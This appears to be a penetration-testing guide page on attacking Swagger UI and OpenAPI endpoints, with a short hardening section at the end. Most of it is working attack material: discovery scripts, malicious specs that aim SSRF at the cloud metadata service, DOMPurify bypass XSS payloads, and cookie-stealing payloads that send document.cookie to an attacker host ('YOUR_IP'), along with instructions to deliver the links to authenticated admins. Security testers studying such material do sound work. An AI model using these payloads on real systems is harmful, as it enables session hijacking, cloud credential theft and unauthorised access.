---
title: "Swagger / OpenAPI Endpoint Testing in Infrastructure"
date: 2026-02-24
draft: false
---

## Overview

Swagger UI is the most widely deployed tool for visualizing and interacting with REST API specifications. When encountered during an infrastructure penetration test, a Swagger UI endpoint represents a complete map of an application's API attack surface: all endpoints, parameters, data models, authentication schemes, and sometimes internal paths are exposed. Beyond information disclosure, several attack vectors specific to Swagger UI and OpenAPI spec handling — including SSRF via `configUrl`, XSS via spec injection, and authentication bypass — make it a high-priority finding.

---

## Locating Swagger Endpoints

### Common Swagger/OpenAPI Paths

```bash
SWAGGER_PATHS=(
  "/swagger-ui.html"
  "/swagger-ui/"
  "/swagger-ui/index.html"
  "/swagger/"
  "/api-docs"
  "/api-docs/"
  "/v2/api-docs"
  "/v3/api-docs"
  "/v1/api-docs"
  "/swagger.json"
  "/swagger.yaml"
  "/openapi.json"
  "/openapi.yaml"
  "/api/swagger.json"
  "/api/swagger.yaml"
  "/api/openapi.json"
  "/api/v1/swagger.json"
  "/api/v2/swagger.json"
  "/api/v3/swagger.json"
  "/docs/"
  "/docs/swagger.json"
  "/redoc"
  "/redoc.html"
  "/api/redoc"
  "/apidoc"
  "/apidocs"
  "/api-documentation"
  "/.well-known/openapi.json"
)

TARGET="http://TARGET_IP"
for path in "${SWAGGER_PATHS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}${path}")
  if [[ "$CODE" != "404" ]] && [[ "$CODE" != "000" ]]; then
    echo "[$CODE] ${TARGET}${path}"
  fi
done
```

### Using ffuf for Swagger Discovery

```bash
# Targeted wordlist for API documentation paths
cat > /tmp/swagger_paths.txt << 'EOF'
swagger-ui.html
swagger-ui/index.html
swagger/
api-docs
v2/api-docs
v3/api-docs
swagger.json
swagger.yaml
openapi.json
openapi.yaml
api/swagger.json
api/v1/swagger.json
api/v2/swagger.json
docs/
redoc
apidocs
EOF

ffuf -u "http://TARGET_IP/FUZZ" -w /tmp/swagger_paths.txt -mc 200,301,302 -ac
```

---

## CVE-2018-25031 — UI Misrepresentation via configUrl / url (SSRF / Phishing)

**CVE:** CVE-2018-25031
**Affected:** Swagger UI < 4.1.3
**Type:** External spec loading without user warning — enables SSRF (server-side) or phishing (client-side)
**Patch:** Swagger UI 4.1.3+ shows a warning dialog before loading an external spec

### Client-Side vs Server-Side — Critical Distinction

In modern Swagger UI v3.x+, the `url` and `configUrl` parameters trigger **CLIENT-SIDE** fetches — the user's browser fetches the JSON spec, not the server. This means:

- `169.254.169.254` cloud metadata attacks only work if the **server** fetches the spec (not the browser)
- In a standard client-side-only deployment, pointing `url=http://169.254.169.254/...` makes the **victim's browser** request that URL, not the backend — this is not useful for cloud credential exfiltration
- To achieve server-side SSRF, the target must use a "Swagger Proxy" or server-side spec validator

**Server-side SSRF vector — `validatorUrl`:**
```javascript
// The validatorUrl parameter causes the SERVER to validate the spec
// Default validates against https://validator.swagger.io — can be overridden
// Inject a callback URL here for confirmed server-side outbound request:
// ?validatorUrl=http://YOUR_IP/capture
// The server will POST the spec to YOUR_IP for "validation" → SSRF
```

```bash
# Test validatorUrl server-side SSRF
curl -s "http://TARGET_IP/swagger-ui.html?validatorUrl=http://YOUR_IP:8080/capture"
# If you receive a request at YOUR_IP:8080 from the server (not your browser) → server-side SSRF
```

### PoC — Check for External Spec Loading

```bash
# CVE-2018-25031 check — does the UI load external specs without warning?
# These URLs will load the external spec in the UI if unpatched (< 4.1.3):
http://TARGET/swagger-ui.html?configUrl=https://example.com/evil.json
http://TARGET/swagger-ui.html?url=https://example.com/evil.json

# In patched versions (4.1.3+): a warning dialog appears before loading
# In unpatched versions: the external spec loads silently
```

The Python exploit by Rafael Cintra Lopes demonstrates this by automating Swagger UI loading with `?configUrl=` / `?url=` pointing to a malicious external JSON, then monitoring browser network traffic to confirm the outbound request to the external spec URL — proving the UI loaded the attacker-controlled spec without user warning.

### Vulnerability Description

Swagger UI accepts a `configUrl` or `url` query parameter that specifies the location of the OpenAPI spec to load. If the application does not sanitize this parameter and runs an unpatched version (< 4.1.3):

- An attacker can load a malicious spec that misrepresents API operations to an authenticated user (phishing — make admin users believe they are interacting with a legitimate API when they are not)
- If `validatorUrl` is server-side, internal network access is achievable

### Identifying the Parameter and Scope

```bash
# Test configUrl parameter
curl -sv "http://TARGET_IP/swagger-ui.html?configUrl=http://YOUR_IP/probe" 2>&1 | head -30

# Alternative parameters (Swagger UI uses different params in different versions)
# Swagger UI 3.x
curl -sv "http://TARGET_IP/swagger-ui.html?url=http://YOUR_IP/probe"

# Swagger UI 4.x+
curl -sv "http://TARGET_IP/swagger-ui.html?configUrl=http://YOUR_IP/evil-config.json"

# Check the page source for the default URL
curl -s "http://TARGET_IP/swagger-ui.html" | grep -iE "configUrl|SwaggerUIBundle|url.*api-docs"
```

### SSRF via configUrl — PoC

```bash
# Step 1: Start a listener to capture the request
python3 -m http.server 8080

# Step 2: Trigger configUrl SSRF
curl -s "http://TARGET_IP/swagger-ui.html?configUrl=http://YOUR_IP:8080/test.json"

# If the server makes an outbound request to YOUR_IP, SSRF is confirmed (server-side)
# If only the browser fetches it, it's client-side only

# Step 3: Internal network probing via SSRF
# Host a malicious config pointing to internal resources
cat > /tmp/evil-config.json << 'EOF'
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "dom_id": "#swagger-ui",
  "presets": ["SwaggerUIBundle.presets.apis"],
  "layout": "StandaloneLayout"
}
EOF
python3 -m http.server 8080 -d /tmp/ &

# Trigger with evil config
curl -s "http://TARGET_IP/swagger-ui.html?configUrl=http://YOUR_IP:8080/evil-config.json"

# The response in Swagger UI will try to load the metadata URL as an OpenAPI spec
# Server-side: metadata is fetched by the backend
# Client-side: user's browser fetches it — visible in browser dev tools
```

### Server-Side SSRF via spec `url` field

```bash
# Host an OpenAPI spec pointing to an internal resource
cat > /tmp/evil-spec.json << 'EOF'
{
  "openapi": "3.0.0",
  "info": {"title": "Evil", "version": "1.0"},
  "servers": [{"url": "http://169.254.169.254/latest/meta-data"}],
  "paths": {
    "/": {
      "get": {"responses": {"200": {"description": "OK"}}}
    }
  }
}
EOF

# If the Swagger UI backend resolves the server URL, you get SSRF
# This is common in API gateways that validate the spec server-side
curl -s "http://TARGET_IP/swagger-ui.html?url=http://YOUR_IP:8080/evil-spec.json"
```

---

## XSS via Swagger Spec Content Injection

Swagger UI renders spec content (titles, descriptions, operation summaries) as HTML in some versions. Injecting XSS payloads into spec fields can result in stored or reflected XSS.

### Petstore XSS — Classic Example

The "petstore XSS" was a well-known stored XSS in Swagger UI that allowed injecting HTML through the spec's `description` fields:

```json
{
  "openapi": "3.0.0",
  "info": {
    "title": "Test API",
    "description": "<img src=x onerror=alert(document.domain)>",
    "version": "1.0"
  },
  "paths": {
    "/test": {
      "get": {
        "summary": "<script>fetch('http://YOUR_IP/?c='+document.cookie)</script>",
        "description": "<img src=x onerror=\"this.src='http://YOUR_IP/xss?c='+document.cookie\">",
        "responses": {
          "200": {"description": "OK"}
        }
      }
    }
  }
}
```

### XSS via configUrl Delivery

```bash
# Host the malicious spec
cat > /tmp/xss-spec.json << 'EOF'
{
  "swagger": "2.0",
  "info": {
    "title": "<img src=x onerror=alert(1)>",
    "description": "<script>alert(document.cookie)</script>",
    "version": "1.0"
  },
  "host": "TARGET_IP",
  "paths": {
    "/test": {
      "get": {
        "summary": "<svg/onload=alert(1)>",
        "description": "test",
        "responses": {"200": {"description": "OK"}}
      }
    }
  }
}
EOF

python3 -m http.server 8080 -d /tmp/ &

# Deliver XSS via configUrl
echo "XSS URL: http://TARGET_IP/swagger-ui.html?url=http://YOUR_IP:8080/xss-spec.json"
# Send this URL to an authenticated admin user

# For cookie theft via XSS
cat > /tmp/steal-spec.json << 'EOF'
{
  "openapi": "3.0.0",
  "info": {
    "title": "API",
    "description": "<img src='x' onerror='fetch(\"http://YOUR_IP:8080/?c=\"+document.cookie)'>",
    "version": "1.0"
  },
  "paths": {}
}
EOF
```

---

## XSS via DOMPurify Bypass in Swagger UI

Swagger UI uses DOMPurify to sanitize spec content (titles, descriptions, operation summaries) before rendering in the browser. Older DOMPurify versions were vulnerable to mutation XSS (mXSS) via namespace confusion, allowing sanitizer bypass.

**Reference:** https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers (analysis of DOMPurify bypass chains in Swagger UI)

### MathML Namespace Bypass (vulnerable DOMPurify versions)

```html
<math><mtext><table><mglyph><style><math><img src=x onerror=alert(1)>
```

The MathML namespace causes DOMPurify's internal DOM tree to differ from the browser's interpretation, allowing the `onerror` handler to survive sanitization in affected versions.

### SVG Animation Bypass

```html
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
```

The `onbegin` event handler in SVG animation elements was not correctly stripped by older DOMPurify. This triggers on page load without user interaction.

### Classic DOM XSS via `url` Parameter (pre-2018 versions)

```
http://TARGET/swagger-ui.html?url=javascript:alert(1)
```

Pre-2018 Swagger UI versions passed the `url` parameter value directly into `window.location` or similar sinks without sanitization.

### Delivery via configUrl

```bash
# Host a spec with DOMPurify-bypassing payloads in description fields
cat > /tmp/mxss-spec.json << 'EOF'
{
  "openapi": "3.0.0",
  "info": {
    "title": "API",
    "description": "<math><mtext><table><mglyph><style><math><img src=x onerror=fetch('http://YOUR_IP/?c='+document.cookie)>",
    "version": "1.0"
  },
  "paths": {}
}
EOF

# Deliver to target
echo "XSS vector: http://TARGET_IP/swagger-ui.html?url=http://YOUR_IP:8080/mxss-spec.json"
# Send to authenticated admin to steal session cookies
```

---

## Unauthenticated API Enumeration

A Swagger UI instance leaks the complete API surface:

```bash
# Download and analyze the OpenAPI spec
curl -s "http://TARGET_IP/v3/api-docs" | python3 -m json.tool > openapi_spec.json

# Extract all endpoints
python3 -c "
import json
with open('openapi_spec.json') as f:
    spec = json.load(f)

print('=== Endpoints ===')
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        auth = 'security' in details or 'security' in spec
        tags = ', '.join(details.get('tags', []))
        print(f'{method.upper():6} {path}  [{tags}]  auth={auth}')
"

# Check for endpoints without security requirements
python3 -c "
import json
with open('openapi_spec.json') as f:
    spec = json.load(f)

print('=== Potentially Unauthenticated Endpoints ===')
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        has_security = 'security' in details
        # Empty security array [] means no auth required!
        if has_security and details.get('security') == []:
            print(f'[NO AUTH] {method.upper()} {path}')
        elif not has_security and 'security' not in spec:
            print(f'[MAYBE] {method.upper()} {path}')
"
```

### Extracting Sensitive Information from Spec

```bash
# Look for sensitive parameters
python3 -c "
import json, re

with open('openapi_spec.json') as f:
    spec_text = f.read()
    spec = json.loads(spec_text)

# Search for password, token, key, secret fields
sensitive_patterns = ['password', 'passwd', 'token', 'secret', 'key', 'apikey', 'api_key', 'authorization', 'credential']

print('=== Sensitive Parameters Found ===')
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        for param in details.get('parameters', []):
            name = param.get('name', '').lower()
            if any(p in name for p in sensitive_patterns):
                print(f'{method.upper()} {path} - param: {param[\"name\"]} ({param.get(\"in\",\"?\")})')

# Search spec text for internal paths/URLs
print()
print('=== Internal URLs/IPs in Spec ===')
internal_patterns = [
    r'10\.\d+\.\d+\.\d+',
    r'192\.168\.\d+\.\d+',
    r'172\.(1[6-9]|2\d|3[01])\.\d+\.\d+',
    r'localhost',
    r'internal\.',
    r'corp\.',
    r'intranet\.',
]
for pattern in internal_patterns:
    matches = re.findall(pattern, spec_text)
    if matches:
        print(f'Pattern \"{pattern}\": {set(matches)}')
"
```

---

## Authentication Bypass via Swagger UI

### Try Endpoints Without Authentication

```bash
# Extract all endpoint paths from spec
SPEC_URL="http://TARGET_IP/v2/api-docs"
curl -s "$SPEC_URL" | python3 -c "
import sys, json
spec = json.load(sys.stdin)
base = spec.get('basePath', '/api')
for path in spec.get('paths', {}).keys():
    print(f'{base}{path}')
" > /tmp/api_endpoints.txt

# Test all endpoints without authentication
while IFS= read -r endpoint; do
  for method in GET POST PUT DELETE; do
    CODE=$(curl -sk -X $method -o /dev/null -w "%{http_code}" "http://TARGET_IP${endpoint}")
    if [[ "$CODE" != "401" ]] && [[ "$CODE" != "403" ]]; then
      echo "[$CODE] $method $endpoint"
    fi
  done
done < /tmp/api_endpoints.txt
```

### Swagger UI "Try It Out" Without Auth

```bash
# Some Swagger UIs allow "Try it out" without valid JWT/API key
# Test by calling endpoints directly with no auth header
curl -s -X GET "http://TARGET_IP/api/v1/users" -H "Accept: application/json"

# Or with empty/null auth
curl -s -X GET "http://TARGET_IP/api/v1/users" -H "Authorization: "
curl -s -X GET "http://TARGET_IP/api/v1/users" -H "Authorization: Bearer"
curl -s -X GET "http://TARGET_IP/api/v1/users" -H "Authorization: Bearer null"
curl -s -X GET "http://TARGET_IP/api/v1/users" -H "Authorization: Bearer undefined"
```

---

## SSRF via `servers` Field in Spec

The `servers` array in OpenAPI 3.0 defines the base URLs for the API. If the Swagger UI proxies requests through a backend, manipulating the servers URL can cause server-side SSRF:

```json
{
  "openapi": "3.0.0",
  "info": {"title": "Test", "version": "1.0"},
  "servers": [
    {"url": "http://169.254.169.254/latest/meta-data"},
    {"url": "http://192.168.1.1/admin"},
    {"url": "http://internal-service:8080"}
  ],
  "paths": {
    "/": {
      "get": {"responses": {"200": {"description": "OK"}}}
    }
  }
}
```

```bash
# Host the malicious spec and trigger via configUrl
curl -s "http://TARGET_IP/swagger-ui.html?url=http://YOUR_IP:8080/evil-servers-spec.json"

# If the Swagger UI makes a request to the selected server URL server-side
# → SSRF achieved
```

---

## Mass Assignment via Undocumented Fields

OpenAPI specs sometimes document only a subset of the fields an API accepts. Testing for undocumented or extra fields is important:

```bash
# Get the spec and understand model schemas
curl -s "http://TARGET_IP/v3/api-docs" | python3 -c "
import sys, json
spec = json.load(sys.stdin)
schemas = spec.get('components', {}).get('schemas', {})
for name, schema in schemas.items():
    props = schema.get('properties', {})
    readonly = [p for p, v in props.items() if v.get('readOnly')]
    print(f'{name}: {list(props.keys())} [readOnly: {readonly}]')
"

# Test mass assignment — include extra fields like isAdmin, role, privilege
curl -s -X POST "http://TARGET_IP/api/v1/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{
    "username": "testuser",
    "email": "test@example.com",
    "password": "Test123!",
    "isAdmin": true,
    "role": "admin",
    "privilege": "superuser",
    "verified": true,
    "accountStatus": "active"
  }' | python3 -m json.tool

# If any extra field is reflected in the response, mass assignment is present
```

---

## swagger-jacker Tool

```bash
# Install swagger-jacker
pip3 install swagger-jacker
# or
git clone https://github.com/BishopFox/swagger-jacker

# Analyze a Swagger spec for security issues
swagger-jacker -s http://TARGET_IP/swagger.json

# Export all endpoint cURL commands
swagger-jacker -s http://TARGET_IP/v2/api-docs --curl

# Dump all endpoints with parameters
swagger-jacker -s http://TARGET_IP/v3/api-docs --endpoints

# Test all endpoints without auth
swagger-jacker -s http://TARGET_IP/v2/api-docs --test
```

---

## Nuclei Swagger Templates

```bash
# Run all Swagger-related nuclei templates
nuclei -u http://TARGET_IP -t exposures/apis/swagger-ui.yaml
nuclei -u http://TARGET_IP -t exposures/apis/openapi.yaml
nuclei -u http://TARGET_IP -t vulnerabilities/other/swagger-ssrf.yaml

# Full API exposure scan
nuclei -u http://TARGET_IP -t exposures/apis/ -t exposures/configs/ -tags swagger,api,openapi

# Custom configUrl SSRF template
cat > /tmp/swagger-ssrf.yaml << 'EOF'
id: swagger-configurl-ssrf
info:
  name: Swagger UI configUrl SSRF
  severity: medium
  tags: swagger,ssrf

requests:
  - method: GET
    path:
      - "{{BaseURL}}/swagger-ui.html?configUrl=http://{{interactsh-url}}"
      - "{{BaseURL}}/swagger-ui/index.html?configUrl=http://{{interactsh-url}}"
      - "{{BaseURL}}/swagger-ui.html?url=http://{{interactsh-url}}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
EOF
nuclei -u http://TARGET_IP -t /tmp/swagger-ssrf.yaml
```

---

## Full Methodology for Infrastructure Swagger Findings

```
1. DISCOVERY
   ├─ ffuf/gobuster with swagger wordlist
   ├─ Check standard paths (/swagger-ui.html, /v2/api-docs, /v3/api-docs, /openapi.json)
   ├─ Spider target for links to API documentation
   └─ Google dork: site:TARGET_IP (swagger OR openapi OR api-docs)

2. SWAGGER UI VERSION CHECK
   ├─ View page source: look for swaggerUi version string
   ├─ < 4.1.3 → CVE-2018-25031 (no warning on external spec load)
   └─ Check DOMPurify version for mXSS applicability

3. configUrl / url ATTACK (CVE-2018-25031)
   ├─ ?configUrl=http://YOUR_IP/probe → check if outbound request is server-side
   ├─ ?url=http://YOUR_IP/probe → same test
   ├─ ?validatorUrl=http://YOUR_IP/capture → confirmed server-side SSRF
   ├─ Note: standard url/configUrl = client-side fetch (browser), NOT server metadata attack
   └─ If server-side confirmed: probe internal services via validatorUrl

4. XSS TESTING
   ├─ Host malicious spec with DOMPurify bypass payloads (mXSS via MathML/SVG)
   ├─ Deliver via ?url=http://YOUR_IP/mxss-spec.json
   ├─ Test classic ?url=javascript:alert(1) (pre-2018 versions)
   └─ Goal: steal session cookies from authenticated admin users

5. API ENUMERATION
   ├─ Download spec: /v3/api-docs → openapi_spec.json
   ├─ Extract all endpoints, methods, parameters
   ├─ Identify endpoints with no security requirements (security: [])
   ├─ Find sensitive parameter names (password, token, key, secret)
   └─ Check servers[] for internal IPs/hostnames

6. AUTHENTICATION TESTING
   ├─ Test each endpoint without auth header
   ├─ Test with empty/null/invalid auth header values
   └─ Test HTTP methods not documented (HEAD, OPTIONS, DELETE, PATCH)

7. REPORTING
   ├─ Document CVE-2018-25031 with PoC URL showing external spec loading
   ├─ Document SSRF findings with confirmation of server-side vs client-side
   ├─ Document XSS with cookie theft PoC
   └─ Rate business risk based on data exposed via unauthenticated API
```

---

## Hardening Recommendations

- Disable Swagger UI in production environments — it should only be available in development
- If Swagger must be available, authenticate it behind the same auth as the API
- Sanitize the `configUrl` and `url` parameters or remove support for custom URLs
- Enable a strict Content Security Policy (CSP) on Swagger UI pages to mitigate XSS
- Use a Swagger UI version >= 4.1.3 which patches several known XSS issues
- Validate OpenAPI specs server-side before rendering
- Do not document internal endpoints in externally accessible specs
- Review OpenAPI spec for sensitive parameter names before publishing
- Implement rate limiting on all API endpoints documented in the spec
- Use `securitySchemes` in OpenAPI 3.0 and mark all endpoints as requiring auth


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.